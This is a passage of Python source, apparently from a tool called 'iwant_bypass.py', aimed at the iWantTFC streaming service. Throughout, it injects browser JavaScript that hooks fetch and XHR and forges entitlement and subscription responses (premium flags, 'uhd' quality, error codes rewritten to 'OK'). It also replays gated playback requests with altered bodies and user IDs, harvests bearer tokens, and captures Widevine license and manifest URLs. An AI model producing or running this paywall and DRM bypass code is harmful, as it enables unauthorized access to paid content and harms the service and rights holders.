            s.mpd_url = norm_mpd(m.group(1))
            ex = EXP.search(s.mpd_url)
            s.mpd_exp = float(ex.group(1)) if ex else 0.0
            ch = True
    if force or not s.license_url:
        m = LIC_U.search(b)
        if m:
            s.license_url = norm_lic(m.group(1))
            s.license_mode = "json" if "/wv/" in s.license_url else "raw"
            s.lic_exp = lic_exp_from_url(s.license_url)
            ch = True
    if force or not s.license_custom_data:
        for k in CUST_K:
            m = re.search(rf'"{k}"\s*:\s*"([^"]{{16,}})"', b)
            if m:
                s.license_custom_data = m.group(1)
                ch = True
                break
    if force or not s.kid:
        m = re.search(r'"kid"\s*:\s*"([^"]{8,})"', b)
        if m:
            s.kid = m.group(1)
            ch = True
    if force or not s.media_id:
        m = re.search(r'"mediaID"\s*:\s*"([^"]{4,})"', b)
        if m:
            s.media_id = m.group(1)
            ch = True
    if force or not s.stream_id:
        m = re.search(r'"streamID"\s*:\s*"?([A-Za-z0-9_\-]{4,})"?', b)
        if m:
            s.stream_id = m.group(1)
            ch = True
    if force or not s.mpds:
        got = re.findall(r'"(https?://[^"\s]+\.mpd[^"\s]*)"', b)
        if got:
            s.mpds = list(dict.fromkeys(got))
            ch = True
            if not s.mpd_url:
                s.mpd_url = max(s.mpds, key=_quality)
                ex = EXP.search(s.mpd_url)
                s.mpd_exp = float(ex.group(1)) if ex else 0.0
                s.mpd_headers = dict(BH)
    if force or not s.m3u8s:
        got = re.findall(r'"(https?://[^"\s]+\.m3u8[^"\s]*)"', b)
        if got:
            s.m3u8s = list(dict.fromkeys(got))
            ch = True
    if ch:
        s.captured_at = time.time()
    return ch


def _scan_performance(page, s):
    try:
        names = page.evaluate(
            "()=>performance.getEntriesByType('resource').map(e=>e.name).slice(-400)")
    except Exception:
        return False
    hit = False
    for u in names or []:
        if MPD_RE.search(u) and not SEG_RE.search(u) and _take_mpd(s, u, _mpd_started(s)):
            log(f"[MPD/perf] {u[:120]}", "w")
            hit = True
        if LIC_RE.search(u) and not SEG_RE.search(u) and not s.license_url:
            s.license_url = u
            s.license_mode = "json" if "/wv/" in u else "raw"
            s.license_headers = {k: v for k, v in BH.items() if k != "content-type"}
            s.captured_at = time.time()
            log(f"[LIC/perf] {u[:120]}", "w")
            hit = True
    return hit


def _skip_ad(page):
    for q in AD_SKIP:
        try:
            el = page.query_selector(q)
            if el and el.is_visible():
                el.click(timeout=1200)
                log(f"ad skip: {q}", "w")
                return True
        except Exception:
            pass
    return False


def _poke_play(page):
    if _skip_ad(page):
        return True
    for step in (
        "()=>{const vs=[...document.querySelectorAll('video')];"
        "const rank=v=>{let s=0;const c=v.currentSrc||v.src||'';"
        "if(c.startsWith('blob:')||v.srcObject)s+=100;"
        "if(v.videoWidth>0)s+=50;if(!v.paused)s+=20;if(v.readyState>=2)s+=10;"
        "const r=v.getBoundingClientRect();"
        "if(r.width>0&&r.height>0)s+=10;"
        "if(v.hidden||getComputedStyle(v).display==='none')s-=100;return s};"
        "vs.sort((a,b)=>rank(b)-rank(a));const v=vs[0];if(v){v.muted=true;"
        "const p=v.play&&v.play();p&&p.catch&&p.catch(()=>{});"
        "v.scrollIntoView({block:'center'});return 'video.play n='+vs.length}return ''}",
        "()=>{const s=['.vjs-big-play-button','button[aria-label*=play i]',"
        "'[class*=play-button]','[class*=poster]','[data-testid*=play]',"
        "'[class*=PlayButton]','[class*=Player] button'];"
        "for(const q of s){const e=document.querySelector(q);if(e){e.click();return q}}return ''}",
        "()=>{const p=document.querySelector('[class*=poster],[class*=Poster],main,body');"
        "if(p){p.click();return 'poster'}return ''}",
    ):
        try:
            got = page.evaluate(step)
            if got:
                log(f"play trigger: {got}")
                return True
        except Exception:
            pass
    try:
        page.mouse.click(640, 380)
        page.keyboard.press("Space")
    except Exception:
        pass
    return False


def _video_state(page):
    try:
        return page.evaluate("""()=>{const vs=[...document.querySelectorAll('video')];
          if(!vs.length)return null;
          const rank=v=>{let s=0;const c=v.currentSrc||v.src||'';
            if(c.startsWith('blob:')||v.srcObject)s+=100;
            if(v.videoWidth>0)s+=50;if(!v.paused)s+=20;if(v.readyState>=2)s+=10;
            const r=v.getBoundingClientRect();
            if(r.width>0&&r.height>0)s+=10;
            if(v.hidden||getComputedStyle(v).display==='none')s-=100;return s};
          vs.sort((a,b)=>rank(b)-rank(a));
          const v=vs[0],c=v.currentSrc||v.src||'';
          const b=v.buffered||{length:0};
          return {n:vs.length,readyState:v.readyState,paused:v.paused,duration:v.duration,
                  currentTime:v.currentTime,videoWidth:v.videoWidth,videoHeight:v.videoHeight,
                  mse:!!(c.startsWith('blob:')||v.srcObject),
                  buffered:b.length?Math.round((b.end(b.length-1)-b.start(b.length-1))*10)/10:0,
                  error:v.error?v.error.code:0,src:c.slice(0,120)}}""")
    except Exception:
        return None


def _page_text(page):
    try:
        return page.evaluate("()=>(document.title||'') + ' ' + ((document.body&&document.body.innerText)||'').slice(0,4000)")
    except Exception:
        return ""


def _ent_fields(blob):
    out = []
    for k in ENT_KEYS:
        for m in re.finditer(rf'"{k}"\s*:\s*("?[^",\}}\]]{{0,40}}"?|null|true|false|\{{)', blob):
            out.append(m.group(0)[:80])
    return _dedupe(out)[:24]


def _dump_paths(s):
    seen = {}
    for t in s.trace:
        if t.get("k") != "req":
            continue
        u = t.get("u") or ""
        if not re.search(r"entitlement|playback|drm|widevine|license|graphql|api/1\.0", u, re.I):
            continue
        seen.setdefault(UUID_RE.sub("<uuid>", _path(u)), set()).add(t.get("m") or "?")
    if not seen:
        log("no entitlement/playback paths in the trace", "w")
        return
    log("entitlement/playback paths observed:", "w")
    for p, methods in sorted(seen.items()):
        log(f"   {'/'.join(sorted(methods)):<8} {p}", "w")


SPOOF_JS = """
(() => {
  const FAKE = __FAKE__;
  const ENT = __ENT__;
  const full = __FULL__;
  const patch = (o) => {
    if (!o || typeof o !== 'object') return o;
    for (const k of Object.keys(o)) {
      if (k === 'entitlements' && full && o[k] && typeof o[k] === 'object') {
        Object.assign(o[k], ENT);
      } else if (k in FAKE && typeof o[k] !== 'object') o[k] = FAKE[k];
      else if (typeof o[k] === 'object') patch(o[k]);
    }
    return o;
  };
  const fix = (t) => full
    ? t.replace(/"EPS-\\\\d{3}-\\\\d{2}"/g, '"OK"')
       .replace(/"statusCode"\\\\s*:\\\\s*"(?!1"|200")[^"]*"/g, '"statusCode":"1"')
       .replace(/"statusMessage"\\\\s*:\\\\s*"(?!OK")[^"]*"/g, '"statusMessage":"OK"')
    : t;
  const of = window.fetch;
  window.fetch = async (...a) => {
    const r = await of(...a);
    if (!/json/.test(r.headers.get('content-type') || '')) return r;
    try {
      const raw = await r.clone().text();
      const j = patch(JSON.parse(raw));
      return new Response(fix(JSON.stringify(j)),
        {status: r.status, statusText: r.statusText, headers: r.headers});
    } catch (e) { return r; }
  };
  const oo = XMLHttpRequest.prototype.open, os = XMLHttpRequest.prototype.send;
  XMLHttpRequest.prototype.open = function () { this.__u = arguments[1]; return oo.apply(this, arguments); };
  XMLHttpRequest.prototype.send = function () {
    this.addEventListener('load', function () {
      if (this.__u && /subs|entitle|playback|subscription|graphql/i.test(this.__u) && this.responseText) {
        try { patch(JSON.parse(this.responseText)); } catch (e) {}
      }
    });
    return os.apply(this, arguments);
  };
  const injStore = (st) => {
    try {
      for (const k of Object.keys(st)) {
        if (!/plan|subscri|entitle|user|profile/i.test(k)) continue;
        const v = st.getItem(k);
        if (!v || !/^[\\\\s]*[{\\\\[]/.test(v)) continue;
        try { st.setItem(k, JSON.stringify(patch(JSON.parse(v)))); } catch (e) {}
      }
    } catch (e) {}
  };
  try { injStore(localStorage); injStore(sessionStorage); } catch (e) {}
  setInterval(() => { try { injStore(localStorage); injStore(sessionStorage); } catch (e) {} }, 2000);
})();
"""


def spoof_script(full):
    return (SPOOF_JS.replace("__FAKE__", json.dumps(PREMIUM))
            .replace("__ENT__", json.dumps(PREMIUM_ENT))
            .replace("__FULL__", "true" if full else "false"))


# ---------------------------------------------------------------- live injection
INJECT_JS = r"""
(cfg) => {
  if (window.__iwant) { window.__iwant.cfg = cfg; return 'already'; }
  const START = /playback\/start/i, GQL = /graphql/i, EP = /(entitlement|playback)/i;
  const GATED = /(EPS-\d{3}-\d{2}|not authorized|not entitled|isFreemium"\s*:\s*true|entitlement"\s*:\s*null|upgrade)/i;
  const FAKE = cfg.fake, ENT = cfg.ent, OVER = cfg.over;
  const state = { on: true, tries: 0, ok: 0, fails: 0, kicked: 0, last: '' };

  const patchObj = (o, deep) => {
    if (!o || typeof o !== 'object') return o;
    for (const k of Object.keys(o)) {
      if (k === 'entitlements' && deep && o[k] && typeof o[k] === 'object') Object.assign(o[k], ENT);
      else if (k in FAKE && typeof o[k] !== 'object') o[k] = FAKE[k];
      else if (typeof o[k] === 'object') patchObj(o[k], deep);
    }
    return o;
  };
  const patchText = (t, deep) => {
    if (!deep) return t;
    return t.replace(/"EPS-\d{3}-\d{2}"/g, '"OK"')
            .replace(/"statusCode"\s*:\s*"(?!1"|200")[^"]*"/g, '"statusCode":"1"')
            .replace(/"statusMessage"\s*:\s*"(?!OK")[^"]*"/g, '"statusMessage":"OK"')
            .replace(/"isFreemium"\s*:\s*true/g, '"isFreemium":false')
            .replace(/"quality"\s*:\s*"(?!uhd)[^"]*"/g, '"quality":"uhd"');
  };

  const mergeSafe = (t) => {
    if (!t || typeof t !== 'object') return t;
    for (const k of Object.keys(t)) {
      if (k === 'playbackCapabilities') {
        if (t[k] && Array.isArray(t[k].resolution)) t[k].resolution = ['uhd'];
        continue;
      }
      if (k in OVER && typeof t[k] !== 'object') t[k] = OVER[k];
      else if (t[k] && typeof t[k] === 'object') mergeSafe(t[k]);
    }
    return t;
  };
  const upgradeBody = (raw) => {
    let b = {};
    try { b = JSON.parse(raw || '{}'); } catch (e) { b = {}; }
    if (cfg.template && cfg.template.body && cfg.template.kind !== 'graphql') {
      b = Object.assign(JSON.parse(JSON.stringify(cfg.template.body)), b);
    }
    if (cfg.template && cfg.template.kind === 'graphql') {
      const t = cfg.template.body || {};
      b = Object.assign({}, t, b);
      if (b.variables && t.variables) b.variables = Object.assign({}, t.variables, b.variables);
      if (b.variables) Object.assign(b.variables, OVER);
      return JSON.stringify(b);
    }
    mergeSafe(b);
    return JSON.stringify(b);
  };

  const of = window.fetch;
  window.fetch = async function (input, init) {
    const url = (typeof input === 'string') ? input : (input && input.url) || '';
    const isStart = START.test(url), isGql = GQL.test(url);

    if (!state.on || (!isStart && !isGql)) {
      const r = await of.apply(this, arguments);
      if (state.on && EP.test(url) && /json/.test(r.headers.get('content-type') || '')) {
        try {
          const t = patchText(await r.clone().text(), true);
          return new Response(t, { status: r.status, statusText: r.statusText, headers: r.headers });
        } catch (e) { return r; }
      }
      return r;
    }

    const first = await of.apply(this, arguments);
    let firstText = '';
    try { firstText = await first.clone().text(); } catch (e) {}
    const looksGated = first.status !== 200 || (isGql && GATED.test(firstText));
    if (!looksGated) { state.ok++; return first; }

    state.tries++;
    const h = new Headers(init && init.headers ? init.headers
      : (input instanceof Request ? input.headers : {}));
    let rawBody = '';
    if (init && init.body) rawBody = init.body;
    else if (input instanceof Request) { try { rawBody = await input.clone().text(); } catch (e) {} }
    const body = upgradeBody(rawBody);
    let again;
    try {
      again = await of(url, { method: 'POST', headers: h, body, credentials: 'include' });
    } catch (e) { state.fails++; state.last = 'ERR'; return first; }
    if (again.status === 200) {
      let t = '';
      try { t = await again.clone().text(); } catch (e) {}
      if (!isGql || !GATED.test(t)) {
        state.ok++;
        state.last = 'upgraded -> 200';
        console.log('[iwant] upgraded', url.slice(-58), first.status, '-> 200');
        return again;
      }
    }
    state.fails++;
    state.last = 'failed ' + first.status;
    console.log('[iwant] upgrade failed', url.slice(-58), first.status,
                (await again.clone().text()).slice(0, 300));
    return first;
  };

  const oo = XMLHttpRequest.prototype.open, os = XMLHttpRequest.prototype.send;
  XMLHttpRequest.prototype.open = function (m, u) { this.__u = u; return oo.apply(this, arguments); };
  XMLHttpRequest.prototype.send = function (b) {
    const u = this.__u || '';
    const self = this;
    if (state.on && START.test(u)) {
      const up = upgradeBody(b);
      this.addEventListener('load', async function () {
        if (self.status !== 200) {
          try {
            const r = await of(u, { method: 'POST', credentials: 'include',
              headers: { 'content-type': 'application/json' }, body: up });
            if (r.status === 200) state.ok++; else state.fails++;
            console.log('[iwant] xhr upgrade', self.status, '->', r.status);
          } catch (e) { state.fails++; }
        }
      });
      if (b) b = up;
    }
    return os.call(this, b);
  };

  const store = (st) => {
    try {
      for (const k of Object.keys(st)) {
        if (!/plan|subscri|entitle|user|profile/i.test(k)) continue;
        const v = st.getItem(k);
        if (!v || !/^[\s]*[{\[]/.test(v)) continue;
        try { st.setItem(k, JSON.stringify(patchObj(JSON.parse(v), true))); } catch (e) {}
      }
    } catch (e) {}
  };

  const kick = async () => {
    const t = cfg.template;
    if (!t || !t.url || state.kicked) return;
    state.kicked++;
    try {
      const body = upgradeBody(JSON.stringify(t.body || {}));
      const r = await of(t.url, { method: 'POST', credentials: 'include',
        headers: { 'content-type': 'application/json' }, body });
      const txt = await r.text();
      state.last = 'kick ' + r.status;
      console.log('[iwant] kick', r.status, txt.slice(0, 300));
      const m = txt.match(/"(https?:\/\/[^"\\]+\.mpd[^"\\]*)"/);
      if (m) window.__iwant.manifest = m[1];
    } catch (e) { console.log('[iwant] kick err', e && e.message); }
  };
  let idle = 0;
  const tick = () => {
    if (!state.on) return;
    store(localStorage); store(sessionStorage);
    try {
      const v = document.querySelector('video');
      if (v && v.paused && v.readyState > 0) v.play().catch(() => {});
    } catch (e) {}
    if (!state.ok && ++idle > 8) { idle = 0; kick(); }
  };
  tick();
  setInterval(tick, 1500);

  window.__iwant = {
    cfg, state, manifest: '',
    off: () => { state.on = false; },
    on: () => { state.on = true; },
    dump: () => ({ ...state, entitlements: localStorage.getItem('activeEntitlements') })
  };
  return 'installed';
}
"""


def inject_cfg():
    tpl = load_template()
    over = dict(PREMIUM_BODY)
    if IDENTF.exists():
        try:
            ident = json.loads(IDENTF.read_text(encoding="utf-8"))
            if ident.get("userId"):
                over["userId"] = ident["userId"]
            if ident.get("country"):
                over["countryCode"] = ident["country"]
        except Exception:
            pass
    return {"fake": PREMIUM, "ent": PREMIUM_ENT, "over": over,
            "template": {"url": tpl.get("url", ""), "body": tpl.get("body") or {},
                         "kind": tpl.get("kind") or "rest"}}


def _rewrite_route(route, full):
    try:
        r = route.fetch()
    except Exception:
        return route.continue_()
    try:
        j = r.json()
    except Exception:
        return route.fulfill(response=r)

    def walk(o):
        if isinstance(o, dict):
            for k in list(o):
                if k == "entitlements" and full and isinstance(o[k], dict):
                    o[k].update(PREMIUM_ENT)
                elif k in PREMIUM and not isinstance(o[k], dict):
                    o[k] = PREMIUM[k]
                elif isinstance(o[k], (dict, list)):
                    walk(o[k])
        elif isinstance(o, list):
            for v in o:
                walk(v)

    walk(j)
    body = json.dumps(j)
    if full:
        body = EPS.sub("OK", body)
    return route.fulfill(status=r.status, headers=r.headers,
                         content_type="application/json", body=body)


def capture(player_url, wait, exe, headless, live, spoof, keep_open, trace, auto_mint, inject,
            no_ads, warm, warm_wait, block):
    if sync_playwright is None:
        sys.exit("pip install playwright")
    if headless and not cdp_alive():
        log("headless without CDP: no Widevine CDM - API chain captures, license POST will not", "w")
    full = spoof == "full"
    s = Session(player_url=player_url, is_live=live)
    ST["last_capture"] = s
    m = ASSET.search(player_url)
    if m:
        s.asset_id = m.group(1)
    if not READY.exists():
        log("profile not seeded - run: python iwant_bypass.py login", "w")
    hosts = {}
    api_hits = [0]
    gated = [0]
    edge_n = [0]

    def on_request(req):
        u = req.url
        h = req.url.split("/")[2] if "//" in req.url else ""
        hosts[h] = hosts.get(h, 0) + 1
        if trace:
            s.trace.append({"k": "req", "m": req.method, "u": u[:300]})
        if "api.iwanttfc.com" in u:
            api_hits[0] += 1
        if "/api/1.0/" in u:
            log(f"[LEGACY-REQ] {req.method} {_path(u)}", "w")
        if EPSPATH_RE.search(u) and not SEG_RE.search(u):
            try:
                pd = req.post_data or ""
            except Exception:
                pd = ""
            kind = "graphql" if GQL_RE.search(u) else ("legacy" if "/api/1.0/" in u else "rest")
            s.observed.append({"method": req.method, "url": u, "kind": kind,
                               "headers": clean(req.headers, DROP_REQ),
                               "body": pd, "status": 0, "resp": ""})
            if (START_RE.search(u) or kind == "graphql") and pd:
                lim = 600 if START_RE.search(u) else 300
                log(f"[BODY/{kind}] {_path(u)}  {pd[:lim]}", "w")
        if MPD_RE.search(u) and not SEG_RE.search(u):
            started = _mpd_started(s)
            if _take_mpd(s, u, started):
                s.mpd_headers = clean(req.headers, DROP_REQ)
                log(f"[MPD]     {u[:120]}")
            else:
                log(f"[MPD/skip] {u[:110]} (keeping {s.mpd_url[:70]})", "w")
        elif LIC_RE.search(u) and not SEG_RE.search(u):
            if not s.license_url:
                s.license_url = u
                s.license_method = req.method
                s.license_headers = clean(req.headers, DROP_REQ)
                ct = s.license_headers.get("content-type", "") or ""
                s.license_content_type = ct or "application/octet-stream"
                s.license_mode = "json" if "json" in ct.lower() or "/wv/" in u else "raw"
                try:
                    s.license_body = req.post_data or ""
                except Exception:
                    s.license_body = ""
                s.captured_at = time.time()
                s.license_post_observed = True
                log(f"[LICENSE] {req.method} {u[:110]}")
        elif HOST_RE.search(u) and not SEG_RE.search(u):
            s.api_chain.append({"method": req.method, "url": u,
                                "headers": clean(req.headers, DROP_REQ),
                                "body": req.post_data, "response_body": ""})

    def on_response(resp):
        u = resp.url
        if trace:
            s.trace.append({"k": "res", "s": resp.status, "u": u[:300]})
        for o in s.observed:
            if o["url"] == u and not o["status"]:
                o["status"] = resp.status
                try:
                    o["resp"] = resp.text()[:2000]
                except Exception:
                    o["resp"] = ""
                if resp.status != 200:
                    edge = bool(EDGE_RE.search(o["resp"] or ""))
                    if edge:
                        edge_n[0] += 1
                        log(f"[EDGE] {resp.status} {_path(u)} (Akamai, not EPS)", "w")
                    else:
                        gated[0] += 1
                        log(f"[GATED] {resp.status} {_path(u)}", "e")
                        if o["resp"]:
                            log(f"   body: {o['resp'][:400]}", "e")
                break
        for e in s.api_chain:
            if e["url"] == u and not e["response_body"]:
                try:
                    e["response_body"] = resp.text()[:200000]
                except Exception:
                    pass
                _scan_blob(s, e["response_body"] or "")
                if GQL_RE.search(u) and e["response_body"]:
                    f = _ent_fields(e["response_body"])
                    if f:
                        s.ent.extend(f)
                        log(f"[ENT] {f[:8]}", "w")
                break
        if "/api/1.0/" in u:
            try:
                t = resp.text()
            except Exception:
                t = ""
            if _scan_blob(s, t) and s.mpds:
                log(f"[LEGACY] {_path(u)} -> {len(s.mpds)} mpd(s), "
                    f"kid={'yes' if s.kid else 'no'}", "g")
        if LIC_RE.search(u) and not SEG_RE.search(u):
            s.license_resp_status = resp.status
            if resp.status == 200:
                s.license_post_observed = True
            for h in CHDR:
                v = resp.headers.get(h)
                if v:
                    s.license_headers[h] = v
            log(f"[LIC-RESP] {resp.status} {u[:100]}")
        if "/playback/" in u or "/entitlement/" in u or GQL_RE.search(u):
            try:
                t = resp.text()
            except Exception:
                t = ""
            em = EPS.search(t)
            if em and not s.blocked:
                s.blocked = em.group(0)
                log(f"[BLOCKED] {s.blocked} from {u.split('/')[-1][:40]}", "e")

    with sync_playwright() as pw:
        ctx = launch_ctx(pw, headless, exe)
        ctx.on("request", on_request)
        ctx.on("response", on_response)
        if trace:
            ctx.on("console", lambda m: s.trace.append(
                {"k": "console", "t": m.type, "x": m.text[:300]}))
            ctx.on("weberror", lambda e: s.trace.append(
                {"k": "pageerror", "x": str(e.error)[:300]}))
        if spoof:
            ctx.add_init_script(spoof_script(full))
        if inject:
            ctx.add_init_script(f"window.__IWANT_CFG = {json.dumps(inject_cfg())};")
            ctx.add_init_script(f"({INJECT_JS})(window.__IWANT_CFG);")
            log("injection armed - gated start/graphql retried, shape-preserving", "g")
        page = ctx.pages[0] if ctx.pages else ctx.new_page()
        ST.setdefault("pages", []).append(page)
        if spoof:
            page.route("**/subs/**", lambda r: _rewrite_route(r, full))
            page.route("**/entitlement/**", lambda r: _rewrite_route(r, full))
            page.route("**/playback/**", lambda r: _rewrite_route(r, full))
            page.route("**/graphql**", lambda r: _rewrite_route(r, full))
        if no_ads:
            for pat in AD_PATTERNS:
                try:
                    page.route(pat, lambda r: r.abort())
                except Exception:
                    pass
            log("ad SDKs blocked", "w")
        for pat in (block or []):
            try:
                page.route(pat, lambda r: r.abort())
                log(f"blocked {pat}", "w")
            except Exception:
                pass

        if warm:
            log("warming origin (Akamai _abck) ...")
            try:
                page.goto(S + "/", wait_until="domcontentloaded", timeout=60000)
                page.wait_for_timeout(int(warm_wait * 1000))
                try:
                    ck = page.evaluate("()=>document.cookie.indexOf('_abck') >= 0")
                    log(f"_abck present: {ck}", "g" if ck else "w")
                except Exception:
                    pass
            except PWTimeout:
                log("warmup timeout", "w")

        log(f"open {player_url}")
        try:
            page.goto(player_url, wait_until="domcontentloaded", timeout=60000)
        except PWTimeout:
            log("navigation timeout", "w")
        try:
            page.wait_for_selector("video", timeout=20000)
            log("<video> present", "g")
        except PWTimeout:
            log("no <video> element after 20s (expected if start is gated)", "w")
        if "/login" in page.url or page.locator("input[type=password]").count():
            log(f"login wall detected (url={page.url}) - run: login", "e")
        if not s.is_live:
            try:
                if LIVE_TXT.search(_page_text(page)):
                    s.is_live = True
                    log("livestream detected -> live cadence", "w")
            except Exception:
                pass
        tok, exp = resolve_token("", None, exe, allow_harvest=True)
        if tok and exp and exp - time.time() < 30:
            log("bearer nearly expired - re-harvesting", "w")
            tok, exp = harvest(exe)
        if tok:
            s.bearer = tok
            report_ttl(tok, exp)
            s.identity = collect_ident(tok)
            if s.identity.get("userId"):
                log("identity captured", "g")
        _poke_play(page)
        log(f"waiting up to {wait}s for manifest + license ...")
        deadline = time.time() + wait
        nxt = 0.0
        last_t = None
        last_move = time.time()
        stall_note = 0.0
        while time.time() < deadline:
            page.wait_for_timeout(400)
            if time.time() > nxt:
                nxt = time.time() + 4
                _scan_performance(page, s)
                vs = _video_state(page)
                if vs:
                    try:
                        now_t = float(vs.get("currentTime") or 0)
                    except (TypeError, ValueError):
                        now_t = 0.0
                    log(f"  video[{vs['n']}]: {'mse' if vs['mse'] else 'native'} "
                        f"rs={vs['readyState']} paused={vs['paused']} "
                        f"t={now_t:.1f} px={vs['videoWidth']}x{vs['videoHeight']} "
                        f"buf={vs['buffered']}s err={vs['error']} dur={vs['duration']}")
                    if vs["paused"]:
                        _poke_play(page)
                    if vs["readyState"] >= 2 and vs["videoWidth"] > 0:
                        if last_t is None or abs(now_t - last_t) > 0.05:
                            last_t, last_move = now_t, time.time()
                        elif time.time() - last_move > 8 and time.time() > stall_note:
                            stall_note = time.time() + 15
                            log("frames present but time is not advancing - poster "
                                "overlay, ad gate, or a decoy <video>", "w")
                if api_hits[0] == 0:
                    _skip_ad(page)
                    _poke_play(page)
            # A 200 licence *response* is the real completion signal: request
            # events are missed when the player fetches through a service worker.
            if (s.license_post_observed or s.license_resp_status == 200) and s.mpd_url:
                log("license response captured - chain complete", "g")
                page.wait_for_timeout(1200)
                break
            if s.mpd_url and s.license_url and not s.is_live:
                page.wait_for_timeout(1200)
                break
        _scan_performance(page, s)
        try:
            s.widevine = bool(page.evaluate("""(async()=>{try{
              await navigator.requestMediaKeySystemAccess('com.widevine.alpha',
                [{initDataTypes:['cenc'],videoCapabilities:[{contentType:'video/mp4;codecs="avc1.42E01E"'}]}]);
              return true}catch(e){return false}})()"""))
        except Exception:
            s.widevine = False
        log(f"Widevine in-context: {'yes' if s.widevine else 'no'}"
            + ("" if s.widevine else " (CDP not attached and CDM blocked)" if not ST.get("cdp") else ""))
        if trace:
            _dump_paths(s)
        if inject:
            try:
                d = page.evaluate("()=>window.__iwant ? window.__iwant.dump() : null")
                if d:
                    log(f"inject: ok={d.get('ok')} fails={d.get('fails')} "
                        f"kicked={d.get('kicked')} last={d.get('last')}",
                        "g" if d.get("ok") else "w")
                    man = page.evaluate("()=>window.__iwant && window.__iwant.manifest")
                    if man and not s.mpd_url:
                        s.mpd_url = man
                        s.mpd_headers = dict(BH)
                        log(f"[KICK-MPD] {man[:110]}", "g")
            except Exception:
                pass

        if api_hits[0] == 0:
            log("ZERO api.iwanttfc.com calls - the player never started.", "e")
            log("causes: ad gate, Akamai challenge, login wall, or hydration failure.", "e")
            log("try: mint <asset> --from-capture --http   (middleware lane, no browser)", "w")
        else:
            log(f"{api_hits[0]} API call(s), {gated[0]} EPS-gated, {edge_n[0]} edge-blocked",
                "g" if not gated[0] else "w")

        if not s.api_chain:
            SHOTS.mkdir(parents=True, exist_ok=True)
            shot = SHOTS / f"{s.asset_id or 'x'}-{datetime.now():%H%M%S}.png"
            try:
                page.screenshot(path=str(shot), full_page=False)
                log(f"screenshot -> {shot}", "w")
            except Exception:
                pass
            log("top hosts seen:", "e")
            for h, n in sorted(hosts.items(), key=lambda x: -x[1])[:10]:
                log(f"   {n:>4}  {h}", "e")

        tpl = [o for o in s.observed if o["body"] and START_RE.search(o["url"])]
        tpl = tpl or [o for o in s.observed if o["body"] and o["kind"] == "graphql"]
        if tpl:
            pick = tpl[-1]
            try:
                body = json.loads(pick["body"])
            except Exception:
                body = pick["body"]
            try:
                TPLF.write_text(json.dumps({"url": pick["url"], "body": body,
                                            "kind": pick["kind"],
                                            "headers": pick["headers"],
                                            "status": pick["status"]}, indent=2),
                                encoding="utf-8")
                log(f"request template -> {TPLF} (kind={pick['kind']}, status={pick['status']})", "g")
                log(f"body was: {pick['body'][:500]}", "g")
                if pick["status"] != 200:
                    log(f"GATED {pick['status']} - run: mint <asset> --from-capture --http", "w")
            except Exception as e:
                log(f"template write failed: {e}", "w")
        else:
            log("no start/graphql request observed - nothing to template", "w")

        if keep_open:
            log("browser left open - press Enter to finish", "w")
            try:
                input()
            except EOFError:
                pass
        close_ctx(ctx)
    if s.license_custom_data:
        for h in CHDR:
            s.license_headers.setdefault(h, s.license_custom_data)
    if auto_mint and not s.api_chain:
        log("no chain captured - attempting a direct mint from the template", "w")
        extra = {}
        if s.identity.get("userId"):
            extra["userId"] = s.identity["userId"]
        res = mint(s, s.asset_id, s.bearer, "", "", True, False, exe,
                   False, body_variants("", True, s.asset_id), no_ads, extra)
        if res["ok"]:
            log(f"mint recovered the chain - {res['reason']}", "g")
        else:
            log(f"mint also failed - {res['reason']}", "e")
    return s


# ---------------------------------------------------------------- replay / probe / chain
def classify(r):
    t = (r.get("text") or "").lower()
    if EDGE_RE.search(t):
        return "EDGE"
    if r["status"] == 200:
        return "BYPASS" if ("ezdrm" in t or "widevine" in t or ".mpd" in t
                            or "mpds" in t or '"kid"' in t or ".m3u8" in t) else "OK-NO-GRANT"
    if r["status"] in (401, 403):
        return "GATED"
    if "entitle" in t or "subscri" in t or "upgrade" in t:
        return "GATED"
    return "INCONCLUSIVE"


def _replay(step, token, body=None):
    h = dict(step.get("headers") or {})
    h.update(BH)
    if token:
        h["authorization"] = f"Bearer {token}"
    else:
        h.pop("authorization", None)
    try:
        r = http.request(step["method"], step["url"], headers=h,
                         data=body if body is not None else step.get("body"), timeout=30)
        return {"status": r.status_code, "text": r.text[:4000]}
    except http.RequestException as e:
        return {"status": "ERR", "text": str(e)}


def _sub(body, keys, value):
    """Substitute. An empty value must NOT blank the field."""
    if not body or not value:
        return body, []
    try:
        p = json.loads(body)
    except ValueError:
        return body, []
    if not isinstance(p, dict):
        return body, []
    t = []
    for k in list(p):
        if k in keys and str(p[k]) != str(value):
            p[k] = value
            t.append(k)
    return (json.dumps(p), t) if t else (body, [])


def _add(body, keys, value):
    """Insert keys that are absent - EPS may trust a body userId/orderId."""
    if not body or not value:
        return body, []
    try:
        p = json.loads(body)
    except ValueError:
        return body, []
    if not isinstance(p, dict):
        return body, []
    t = []
    for k in keys:
        if k not in p:
            p[k] = value
            t.append(k)
    return (json.dumps(p), t) if t else (body, [])


def _mint_reset(s, keep_headers=True):
    hdrs = dict(s.license_headers) if keep_headers else {}
    for f in ("mpd_url", "license_url", "license_custom_data"):
        setattr(s, f, "")
    s.mpd_exp = 0.0
    s.lic_exp = 0.0
    s.captured_at = 0.0
    s.license_headers = hdrs


def _mint_finish(s):
    if s.license_custom_data:
        for hname in CHDR:
            s.license_headers[hname] = s.license_custom_data
    if s.uauth:
        s.license_headers = uauth_headers(s.uauth, s.license_auth or "query")
    return bool(s.mpd_url and s.license_url)


def _reinject(s, body):
    if isinstance(body, str) and s.identity.get("userId"):
        b, _ = _sub(body, UID_K, s.identity["userId"])
        b, _ = _add(b, UID_K, s.identity["userId"])
        return b
    return body


def _replay_order(s):
    """The playback/start step is the only one that mints; page GETs are dead weight."""
    api, rest = [], []
    for st in s.api_chain:
        (api if "api.iwanttfc.com" in (st.get("url") or "") else rest).append(st)
    api.sort(key=lambda st: 0 if "playback/start" in (st.get("url") or "") else 1)
    return api + rest


def remint(s, token=""):
    _mint_reset(s)
    tok = token or s.bearer
    for step in _replay_order(s):
        h = dict(step.get("headers") or {})
        h.update(BH)
        if tok:
            h["authorization"] = f"Bearer {tok}"
        else:
            h.pop("authorization", None)
        body = _reinject(s, step.get("body"))
        if "playback/start" in (step.get("url") or "") and "playbackSessionId" in (body or ""):
            try:
                j = json.loads(body)
                j["playbackSessionId"] = str(uuid.uuid4())
                body = json.dumps(j)
            except (ValueError, TypeError):
                pass
        try:
            r = http.request(step["method"], step["url"], headers=h, data=body, timeout=30)
        except http.RequestException:
            continue
        if r.status_code != 200:
            continue
        step["response_body"] = r.text[:200000]
        _scan_blob(s, r.text)
        if s.mpd_url and s.license_url:
            return _mint_finish(s)
    return bool(s.mpd_url and s.license_url)


def remint_sub(s, token, foreign, field):
    _mint_reset(s)
    tok = token or s.bearer
